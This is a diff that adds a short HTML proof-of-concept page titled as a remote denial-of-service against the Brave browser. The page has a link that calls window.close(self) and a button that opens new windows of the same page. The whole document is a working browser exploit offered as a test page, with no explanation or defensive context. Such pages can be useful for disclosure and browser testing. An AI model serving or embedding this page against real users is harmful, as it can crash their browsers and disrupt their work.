@@ -1,0 +1,13 @@
+<html>
+<title>Brave Window Object Remote Denial of Service.</title>
+<body><br><br>
+<center><a href="javascript:window.close(self);">Brave Window Object DoS Test POC</a></center>
+
+    <button>test opening window</button>
+<script>
+    document.querySelector('button').onclick = function () {
+        let w = window.open(window.location.href, '_blank', "width=500 height=500")
+    }
+</script>
+</body>
+</html>
